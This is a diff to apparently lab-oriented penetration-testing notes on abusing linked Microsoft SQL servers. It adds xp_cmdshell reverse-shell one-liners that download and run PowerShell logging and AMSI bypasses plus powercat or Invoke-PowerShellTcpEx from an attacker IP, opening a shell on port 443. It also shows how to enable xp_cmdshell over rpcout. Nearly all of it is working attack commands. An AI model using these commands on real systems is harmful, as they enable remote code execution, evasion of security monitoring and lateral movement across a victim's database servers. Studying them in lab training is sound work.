@@ -32,10 +32,11 @@ In case of database links between SQL servers, that is, linked SQL servers it is
 select * from master..sysservers
 
 # database links
-Get-SQLServerLinkCrawl -Instance dcorp-mssql 
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
 # Using HeidiSQL 
 select * from openquery("DCORP-SQL1", 'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
-
+
+
 </code></pre>
 
 ## Abuse
@@ -59,11 +60,13 @@ FROM OPENQUERY("dcorp-sql1", '
 
 
 # revshell example
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex ((New-Object Net.WebClient).DownloadString(''http://172.16.100.83/powercat.ps1;powercat -c 172.16.100.83 -p 443 -e powershell''));"' -QueryTarget eu-sql32
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/loggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/powercat.ps1);powercat -c 172.16.100.x -p 443 -e powershell"''' -QueryTarget eu-sql32
+# OR Normally like below
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/loggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/amsibypass.txt); iex(iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql32
 
 ```
 
-In case that  `rpcout` is enabled (disabled by default), xp\_cmdshell can be enabled using:
+In case that `rpcout` is enabled (disabled by default), xp\_cmdshell can be enabled using:
 
 ```sql
 EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
